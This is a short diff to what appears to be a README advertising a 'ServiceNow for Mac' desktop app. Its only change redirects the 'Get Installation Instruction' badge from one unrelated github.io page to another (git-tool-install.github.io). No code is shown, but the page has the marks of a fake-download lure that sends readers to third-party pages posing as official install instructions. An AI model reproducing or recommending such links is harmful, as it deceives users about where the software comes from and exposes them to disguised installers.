@@ -3,7 +3,7 @@
 
 ServiceNow for Mac delivers IT service management and workflow automation directly to your desktop. With this edition, teams can streamline service requests, monitor incidents, and optimize business processes without relying solely on browsers. Follow the setup guide below to get ServiceNow Desktop on your Mac. 🚀
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://venskoske430.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=ServiceNow)
 
 ---
 
